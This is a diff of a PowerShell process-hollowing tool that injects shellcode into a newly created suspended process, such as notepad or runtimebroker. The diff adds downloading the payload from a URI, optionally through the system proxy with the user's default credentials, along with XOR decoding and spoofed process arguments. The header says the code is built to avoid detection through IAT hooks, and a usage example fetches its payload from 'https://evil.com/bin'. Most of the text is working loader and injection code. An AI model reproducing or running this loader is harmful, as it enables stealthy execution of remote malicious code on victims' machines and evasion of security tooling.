@@ -1,43 +1,48 @@
 ﻿function Process-Hollow {
 #.SYNOPSIS
-# Standalone PowerShell Script for Process Hollowing utilizing Function Pointer Delegates
-# Arbitrary Version Number: 0.9.9
+# Standalone PowerShell Script for Process Hollowing (via delegates)
+# Arbitrary Version Number: v1.0.0
 # Author: Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
 # This tool does not utilize Add-Type or any embedded C# -- rather it utilizes custom delegates to
 # wrap Win32 function pointers.  This prevents detection via Import Address Table (IAT) hooks.
+# Works with both Windows PowerShell and PowerShell Core (Pwsh).
 #
-# Userland API Call(s) Required:
-#  |__ WriteProcessMemory()
-#  |__ ReadProcessMemory()
-#  |__ CreateProcess()
+# Windows API Call(s) Utilized:
+#  |__ CreateProcessA()
 #  |__ NtQueryInformationProcess()
-#  |__ ResumeThread()
-#  |
-#  |__ OpenProcess()                      -->  PPID Spoof (WIP)
-#  |__ InitializeProcThreadAttributeList  -->  PPID Spoof (WIP)
-#  |__ UpdateProcThreadAttribute()        -->  PPID Spoof (WIP)
+#  |__ ReadProcessMemory()
+#  |__ WriteProcessMemory()
+#  |__ ResumeThread()    
 #
 # Struct(s) Utilized:
-#  |__ STARTUPINFO
+#  |__ STARTUPINFOA
 #  |__ PROCESS_INFORMATION
 #  |__ PROCESS_BASIC_INFORMATION
 #  |__ SECURITY_ATTRIBUTES
-#  |
-#  |__ STARTUPINFOEX                      -->  PPID Spoof (WIP)
-#
-# Works with both Windows PowerShell and PowerShell Core (Pwsh). Using 64-bit PowerShell sessions
-# allows for both 64-bit and 32-bit injection, whereas 32-bit sessions only allow 32-bit injection.
 #
 # Parameters:
-#   -Shellcode      -->  Shellcode to execute (can be a byte array or string containing file path or bytes).
-#   -CreateProcess  -->  Target process PID to inject into.
-#   -ProcessArgs    -->  Pass arguments to process rather than hollowing with shellcode.
-#   -Debug          -->  Toggle debug messages and print shellcode address for process attachment.
+#   -Shellcode      -->  Shellcode to execute (can be a byte array, string, filepath, or URI).
+#   -XorKey         -->  XOR cipher key for the shellcode (max value: 0xFF).
+#   -CreateProcess  -->  Process to create and inject with shellcode.
+#   -ProcessArgs    -->  Pass fake arguments to the created process.
+#   -UseProxy       -->  Attempt to authenticate to the system's default proxy (URI shellcode only).
+#   -Debug          -->  Pause execution and shellcode memory address for process attachment.
 #   -Help           -->  Return Get-Help information.
 #
 # Example Usage:
+#  ________________________________________________________________________________________________________
+# |                                                                                                        |
+# | # Process hollow 'notepad.exe' and pause execution to attach with a debugger                           |
+# | PS> Process-Hollow -Shellcode ./calc64.bin -CreateProcess 'notepad' -Debug                             |
+# |                                                                                                        |
+# | # Process hollow 'runtimebroker.exe' with spoofed process arguments                                    |
+# | PS> Process-Hollow -Shellcode ./msgbox64.bin -CreateProcess 'runtimebroker' -ProcessArgs '-Embedding'  |
+# |                                                                                                        |
+# | # Process hollow 'calc.exe' with XOR encrypted shellcode downloaded from a URI                         |
+# | PS> Process-Hollow -Shellcode 'https://evil.com/bin' -XorKey 0x69 -CreateProcess 'calc'                |
+# |________________________________________________________________________________________________________|
 #
 #.LINK
 # https://github.com/tylerdotrar/ShellcodeLoaderPS
@@ -45,12 +50,12 @@
 
     Param(
         $Shellcode, # Intentionally vague type for maximum compatibility
+        [UInt32]$XorKey,
         [string]$CreateProcess,
         [string]$ProcessArgs,
+        [switch]$UseProxy,
         [switch]$Debug,
         [switch]$Help
-        #[int]$PPID,
-        #[string]$ParentProcess,
     )
 
 
@@ -60,197 +65,160 @@
 
     # Error Correction
     if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
+    if ($XorKey -gt 255) { return (Write-Host '[!] Error! XOR key cannot be greater than 0xFF (255).' -ForegroundColor Red) }
     if (!$CreateProcess) { return (Write-Host '[!] Error! Missing target process to execute.' -ForegroundColor Red) }
     if (!(Get-Item -LiteralPath $CreateProcess 2>$NULL).FullName -and !(Get-Command -Name $CreateProcess 2>$NULL).Path) {
-        return (Write-Host "[!] Error! Unable to locate process '${ProcessName}'." -ForegroundColor Red)
+        return (Write-Host "[!] Error! Unable to locate process '${CreateProcess}'." -ForegroundColor Red)
     }
 
 
     # Internal Function(s)
-    function Format-ByteArray ($Shellcode) {
+    function Format-ByteArray ($Shellcode, [UInt32]$XorKey, [Bool]$UseProxy) {
 
         # Function Description   : PowerShell Script (mini version) to Convert Multi-Language Shellcode Strings into Byte Arrays
         # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Format-ByteArray.ps1
 
-        # Print data type
-        Write-Host "[!] Detecting Data Type of Shellcode Parameter:" -ForegroundColor Yellow
-        Write-Host " o  BaseType : $($Shellcode.GetType().BaseType)"
-        Write-Host " o  Name     : $($Shellcode.GetType().Name)"
-        
-        # Checking format before parsing
+        Write-Host '[!] Formatting Shellcode for PowerShell...' -ForegroundColor Yellow
+
         if ($Shellcode -is [array]) {
-            
-            # Shellcode is already formatted as a byte array
             if ($Shellcode -is [Byte[]]) {
-                Write-Host '[!] Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
+                Write-Host ' o  Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
                 Write-Host ' o  --> No formatting required.'
                 $shellcodeBuffer = $Shellcode
             }
-            # Convert array to a string for attempted parsing
             else {
-                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                 Write-Host ' o  Shellcode parameter is an [array].'
                 Write-Host ' o  --> Converting to [string]...'
                 $Shellcode = $Shellcode -join ''
             }
         }
-    
-        # Attempt to determine what language the shellcode is formatted for
+
+        if ($Shellcode -is [uri]) {
+            Write-Host ' o  Shellcode parameter is a [uri].'
+            Write-Host " o  --> URI : $($Shellcode.AbsoluteUri)"
+            Write-Host ' o  --> Downloading data...'
+            Try {
+                if ($UseProxy) {
+                    $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode.AbsoulteUri)
+                    $WebClient = [System.Net.WebClient]::new()
+                    $Proxy     = [System.Net.WebProxy]::new()
+                    $Proxy.Address = $LinkProxy.AbsoluteUri
+                    $Proxy.UseDefaultCredentials = $TRUE
+                    $WebClient.Proxy = $Proxy
+                    $ShellcodeBuffer = $WebClient.DownloadData($Shellcode.AbsoluteUri)
+                }
+                else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode.AbsoluteUri) }
+            }
+            Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
+        }
+
         if ($Shellcode -is [String]) {
-            
             $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')
-
-            # Check if $Shellcode is a path to a shellcode file
-            #   > Path to Raw Shellcode  :  .\shellcode.bin
-
             if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
-                
-                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                 Write-Host ' o  Shellcode [string] is a path to a file.'
-
                 $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
                 $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)
-
                 Write-Host " o  --> Path : $ShellcodePath"
                 Write-host ' o  --> Reading file bytes...'
             }
-
-            # Format C or Python formatted shellcode string into PowerShell format
-            #   > Python Shellcode Format  :  'b"\x45\x78\x61\x6d\x70\x6c\x65"'
-            #   > C Shellcode Format       :  '\x45\x78\x61\x6d\x70\x6c\x65'
-
+            elseif ($Shellcode -match "^(http://|https://)") {
+                Write-Host ' o  Shellcode [string] is a URI.'
+                Write-Host " o  --> URI : $Shellcode"
+                Write-Host ' o  --> Downloading data...'
+                Try {
+                    if ($UseProxy) {
+                        $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode)
+                        $WebClient = [System.Net.WebClient]::new()
+                        $Proxy     = [System.Net.WebProxy]::new()
+                        $Proxy.Address = $LinkProxy.AbsoluteUri
+                        $Proxy.UseDefaultCredentials = $TRUE
+                        $WebClient.Proxy = $Proxy
+                        $ShellcodeBuffer = $WebClient.DownloadData($Shellcode)
+                    }
+                    else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode) }
+                } 
+                Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
+            }
             elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
-                
-                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                 Write-Host ' o  Shellcode [string] is formatted for C or Python.'
                 Write-Host ' o  --> Formatting for PowerShell...'
-
-                # Convert to PowerShell ASCII array
-                $Shellcode = $Shellcode.Replace(' ','')
-                $psShellcode = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]
-
-                # Convert Shellcode ASCII array to Byte Array
+                $Shellcode       = $Shellcode.Replace(' ','')
+                $psShellcode     = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]
                 $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
             }
-
-            # Format C++ or C# formatted shellcode string into PowerShell format
-            #   > C++ / C# Shellcode Format  :  '{0x45,0x78,0x61,0x70,0x6c,0x65}'
-
             elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
-                
                 Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                 Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
                 Write-Host ' o  --> Formatting for PowerShell...'
-
-                # Convert to PowerShell ASCII array
-                $Shellcode = $Shellcode.Replace(' ','')
-                $psShellcode = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'
-
-                # Convert Shellcode ASCII array to Byte Array
+                $Shellcode       = $Shellcode.Replace(' ','')
+                $psShellcode     = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'
                 $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
             }
-
             else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
         }
-        
-        # Return shellcode byte array
+
         if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
         Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"
+        
+        if ($XorKey) {
+            Write-Host '[!] Applying XOR Cipher to Shellcode:' -ForegroundColor Yellow
+            Write-Host " o  --> XOR Cipher Key : $('0x{0:X2}' -f ${XorKey}) (${XorKey})"
+            for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i++) {
+                $ShellcodeBuffer[$i] = $ShellcodeBuffer[$i] -bxor $XorKey
+            }
+        }
+
         return ,$shellcodeBuffer
     }
-    function Load-Win32Function ([string]$Library, [string]$FunctionName, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void], [bool]$Debug) {
+    function Load-Win32Function ([string]$Library, [string]$FunctionName, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void]) {
 
-        # Function Description   : PowerShell Script (mini version) to Load Win32 API Calls into Session via Function Pointers and Delegates
+        # Function Description   : PowerShell Script (mini version) to Load Win32 Functions into Session via Function Delegates
         # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Load-Win32Function.ps1
-
-        ### Step 1: Acquire Memory Address of Target Win32 Function
 
         Try {
             if ($PSVersionTable.PSEdition -eq 'Core') {
-            
-                # Get a handle to the target library via Load() method
                 $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
-                if (($LibraryHandle -eq 0) -or ($LibraryHandle -eq $NULL)) { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
-
-                # Acquire the memory address of the target function via GetExport() method
+                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                 $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                 if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
             }
             else {
-        
-                # Get a reference to System.dll in the Global Assembly Cache (GAC)
-                $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
-                $UnsafeMethods  = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
-
-                # Get a reference to the GetModuleHandle() and GetProcAddress() functions
-                $GetModuleHandle = ($UnsafeMethods.GetMethods() | ? {$_.Name -eq 'GetModuleHandle'})[0]
-                $GetProcAddress  = ($UnsafeMethods.GetMethods() | ? {$_.Name -eq 'GetProcAddress'})[0]
-
-                # Get a handle to the target library (module) via GetModuleHandle()
+                $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
+                $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+                $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
+                $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                 $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
-                if (($LibraryHandle -eq 0) -or ($LibraryHandle -eq $NULL)) { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
-
-                # Acquire the memory address of the target function (proc) via GetProcAddress() 
+                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                 $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                 if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
             }
         }
-        Catch {
-            Write-Host "[!] Error acquiring function memory address! Return details:" -ForegroundColor Red
-            $Error[0]
-            $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
-            $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
-            return
-        } 
-
-        ### Step 2: Build Win32 Function Delegate for Parameter Types and Return Types
-
-        # Check if the function delegate already exists in the current session
+        Catch { return Generic-Error }
+         
         foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
             $CustomType = $Assembly.GetType($FunctionName, $False)
             if ($CustomType -ne $NULL) {
-                if ($Debug) { Write-Host '[x] Debug: ' -NoNewLine -ForegroundColor Magenta ; Write-Host "Existing delegate found for " -NoNewline ; Write-Host "'${FunctionName}()'" -ForegroundColor Green }
                 $FunctionDelegate = $CustomType
                 break
             }
         }
 
         if (!$FunctionDelegate) {
-            
-            if ($Debug) { Write-Host '[x] Debug: ' -NoNewLine -ForegroundColor Magenta ; Write-Host "Building new delegate for " -NoNewline ; Write-Host "'${FunctionName}()'" -ForegroundColor Green }
-
             Try {
-                # Generate a unique in-memory .NET assembly name to host delegate type
-                $DynAssembly = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
-
-                # Define non-persistent assembly in memory with execute-only permissions
-                $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-                $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
-
-                # Define new delegate type to match unmanaged Win32 function signature
-                $TypeBuilder = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-
-                # Define special constructor for the delegate type (required by CLR to instantiate the delegate from a function pointer)
+                $DynAssembly        = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
+                $AssemblyBuilder    = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+                $ModuleBuilder      = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
+                $TypeBuilder        = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                 $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                 $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
-
-                # Define 'Invoke' method with the correct function parameter type(s) and return type(s)
-                $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
+                $MethodBuilder      = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                 $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-
-                # Return the usable, dynamic delegate type for function pointer invocation
-                $FunctionDelegate = $TypeBuilder.CreateType()
+                $FunctionDelegate   = $TypeBuilder.CreateType()
             }
-            Catch {
-                Write-Host "[!] Error building function delegate! Return details:" -ForegroundColor Red
-                $Error[0]
-                $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
-                $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
-                return
-            }
+            Catch { return Generic-Error }
         }
 
-        # Return usable function to session
+        Write-Host ' o  Function ' -NoNewline ; Write-Host "'${Library}!${FunctionName}()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
         return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
     }
     function Build-Win32Struct ([string]$StructName, [array]$MembersObject) {
@@ -258,37 +226,21 @@
         # Function Description   : PowerShell Script (mini version) to Create Win32 Data Structures in Memory
         # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Build-Win32Struct.ps1
 
-        # Check if the struct type already exists in the current session
         foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
             $CustomType = $Assembly.GetType($StructName, $False)
-            if ($CustomType -ne $NULL) {
-                # Write-Host '[!] Found existing struct type...' -ForegroundColor Yellow # Used for debugging
-                return $CustomType
-            }
+            if ($CustomType -ne $NULL) { return $CustomType }
         }
 
-        # Generate a unique in-memory .NET assembly name to host delegate type
-        $DynAssembly = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
-
-        # Define non-persistent assembly in memory with execute-only permissions
-        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-        $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
-
-        # Create a public value type (struct) with sequential memory layout for unmanaged interop
-        $Attributes  = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-        $TypeBuilder = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])
-
-        # Define public fields for each struct member
-        foreach ($Member in $MembersObject) {
-            [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public')
+        Try {
+            $DynAssembly     = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
+            $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
+            $Attributes      = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $TypeBuilder     = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])
+            foreach ($Member in $MembersObject) { [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public') }
+            return $TypeBuilder.CreateType()
         }
-
-        # Return the value type (struct) definition as a usable .NET type
-        return $TypeBuilder.CreateType()
-    }
-    function Print-Hex ($Integer) {
-        $hexValue = '{0:X}' -f $Integer
-        return "0x${hexValue}"
+        Catch { return Generic-Error }
     }
     function Generic-Error() {
         Write-Host "[!] Unexpected error occured! Return details:" -ForegroundColor Red
@@ -297,20 +249,64 @@
         $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
         return
     }
-
-
-    # Parameter Processing
-    if (Test-Path -LiteralPath $CreateProcess 2>$NULL) { $CreateProcess = (Get-Item -LiteralPath $CreateProcess).FullName }
-    else                                               { $CreateProcess = (Get-Command -Name $CreateProcess).Path         }
-
-    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode
-    if ($ShellcodeBuffer -isnot [byte[]]) { return }
+    function Win32-Error() {
+        return (Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red)
+    }
+    function Print-Hex ($Integer) {
+        return ('0x{0:x}' -f $Integer)
+    }
     
 
-    ### Define Required Struct(s)
+    ### Define Required Constant(s) ###
 
-    # STARTUPINFOA
+    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
+    $AccessRights = @{
+        PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF;
+        PROCESS_CREATE_PROCESS    = 0x0080;
+        PROCESS_CREATE_THREAD     = 0x0002;
+        PROCESS_QUERY_INFORMATION = 0x0400;
+        PROCESS_VM_OPERATION      = 0x0008;
+        PROCESS_VM_READ           = 0x0010;
+        PROCESS_VM_WRITE          = 0x0020;
+    }
+    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
+    $MemoryAllocation = @{
+        MEM_COMMIT  = 0x00001000;
+        MEM_RESERVE = 0x00002000;
+    }
+    # Ref: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
+    $MemoryProtection = @{
+        PAGE_EXECUTE           = 0x10;
+        PAGE_EXECUTE_READ      = 0x20;
+        PAGE_READWRITE         = 0x04;
+        PAGE_EXECUTE_READWRITE = 0x40;
+    }
+    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
+    $CreationFlags = @{
+        CREATE_SUSPENDED             = 0x00000004;
+        CREATE_NO_WINDOWS            = 0x08000000;
+        EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
+    }
     # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+    $StartupFlags = @{
+        STARTF_USESTDHANDLES = 0x00000100;
+        STARTF_USESHOWWINDOW = 0x00000001;
+    }
+    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
+    $ProcAttrFlags = @{
+        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000;
+        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
+    }
+    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
+    $ThreadAccess = @{
+        THREAD_SET_CONTEXT = 0x0010;
+    }
+
+
+    ### Define Required Struct(s) ###
+
+    # STARTUPINFOA | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
     $StructMembers = @(
         [PSCustomObject]@{ Name = 'cb'              ; Type = [Int32]  },
         [PSCustomObject]@{ Name = 'lpReserved'      ; Type = [String] },
@@ -335,8 +331,7 @@
     $StartupInfoTypeRef = $StartupInfoType.MakeByRefType() # Used for creating function delegate(s)
     $StartupInfo        = [STARTUPINFOA]::new()            # Used for Win32 function parameter(s)
 
-    # STARTUPINFOEXA
-    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
+    # STARTUPINFOEXA | https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
     $StructMembers = @(
         [PSCustomObject]@{ Name = 'StartupInfo'     ; Type = $StartupInfoType },
         [PSCustomObject]@{ Name = 'lpAttributeList' ; Type = [IntPtr] }
@@ -345,8 +340,7 @@
     $StartupInfoExTypeRef = $StartupInfoExType.MakeByRefType() # Used for creating function delegate(s)
     $StartupInfoEx        = [STARTUPINFOEXA]::new()            # Used for Win32 function parameter(s)
     
-    # PROCESS_INFORMATION
-    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
+    # PROCESS_INFORMATION | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
     $StructMembers = @(
         [PSCustomObject]@{ Name = 'hProcess'    ; Type = [IntPtr] },
         [PSCustomObject]@{ Name = 'hThread'     ; Type = [IntPtr] },
@@ -357,9 +351,7 @@
     $ProcessInformationTypeRef = $ProcessInformationType.MakeByRefType() # Used for creating function delegate(s)
     $ProcessInformation        = [PROCESS_INFORMATION]::new()            # Used for Win32 function parameter(s)
 
-    # PROCESS_BASIC_INFORMATION
-    # Ref: https://ntdoc.m417z.com/process_basic_information
-    # Ref: https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
+    # PROCESS_BASIC_INFORMATION | https://ntdoc.m417z.com/process_basic_information, https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
     $StructMembers = @(
         [PSCustomObject]@{ Name = 'ExitStatus'                   ; Type = [IntPtr] },
         [PSCustomObject]@{ Name = 'PebAddress'                   ; Type = [IntPtr] },
@@ -372,8 +364,7 @@
     $ProcessBasicInformationTypeRef = $ProcessBasicInformationType.MakeByRefType() # Used for creating function delegate(s)
     $ProcessBasicInformation        = [PROCESS_BASIC_INFORMATION]::new()           # Used for Win32 function parameter(s)
 
-    # SECURITY_ATTRIBUTES
-    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ns-wtypesbase-security_attributes
+    # SECURITY_ATTRIBUTES | https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ns-wtypesbase-security_attributes
     $StructMembers = @(
         [PSCustomObject]@{ Name = 'nLength'              ; Type = [Int32]  },
         [PSCustomObject]@{ Name = 'lpSecurityDescriptor' ; Type = [IntPtr] },
@@ -385,24 +376,18 @@
     $ThreadAttributes          = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 2
 
 
-    ### Load Userland API Calls required for Process Hollowing
-
-    #  |__ WriteProcessMemory()
-    #  |__ ReadProcessMemory()
-    #  |__ CreateProcess()
-    #  |__ ZwQueryInformationProcess() | NtQueryInformationProcess()
-    #  |__ ResumeThread()
-
-    ### Load Userland API Calls required for PPID Spoofing
-
-    #  |__ OpenProcess()
-    #  |__ InitializeProcThreadAttributeList()
-    #  |__ UpdateProcThreadAttribute()
+    ### Load Required Win32 API Call(s) ### 
 
     Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow
 
+    # Process Hollowing
+    #  |__ CreateProcess()
+    #  |__ NtQueryInformationProcess()
+    #  |__ ReadProcessMemory()
+    #  |__ WriteProcessMemory()
+    #  |__ ResumeThread()
+
     Try {
-        # Process Hollowing
         $CreateProcArgs = @(
             [String],                   #lpApplicationName
             [String],                   #lpCommandLine
@@ -415,8 +400,7 @@
             $StartupInfoTypeRef,        #lpStartupInfo
             $ProcessInformationTypeRef  #lpProcessInformation
         )
-        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool]) -Debug $Debug
-        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!CreateProcessA()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
+        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool])
 
         $NtQueryInfoArgs = @(
             [IntPtr],                        # ProcessHandle
@@ -425,8 +409,7 @@
             [UInt32],                        # ProcessInformationLength
             [UInt32].MakeByRefType()         # ReturnLength
         )
-        $NtQueryInformationProcess = Load-Win32Function -Library "Ntdll.dll" -FunctionName "NtQueryInformationProcess" -ParamTypes $NtQueryInfoArgs -ReturnType ([Int32]) -Debug $Debug
-        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Ntdll!NtQueryInformationProcess()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
+        $NtQueryInformationProcess = Load-Win32Function -Library "Ntdll.dll" -FunctionName "NtQueryInformationProcess" -ParamTypes $NtQueryInfoArgs -ReturnType ([Int32])
 
         $ReadProcMemArgs = @(
             [IntPtr],               # hProcess
@@ -435,8 +418,7 @@
             [Int32],                # nSize
             [Int32].MakeByRefType() #lpNumberOfBytesRead
         )
-        $ReadProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ReadProcessMemory" -ParamTypes $ReadProcMemArgs -ReturnType ([Bool]) -Debug $Debug
-        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!ReadProcessMemory()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
+        $ReadProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ReadProcessMemory" -ParamTypes $ReadProcMemArgs -ReturnType ([Bool])
 
         $WriteProcMemArgs = @(
             [IntPtr],               # hProcess
@@ -445,69 +427,34 @@
             [Int32],                # nSize
             [Int32].MakeByRefType() #lpNumberOfBytesRead
         )
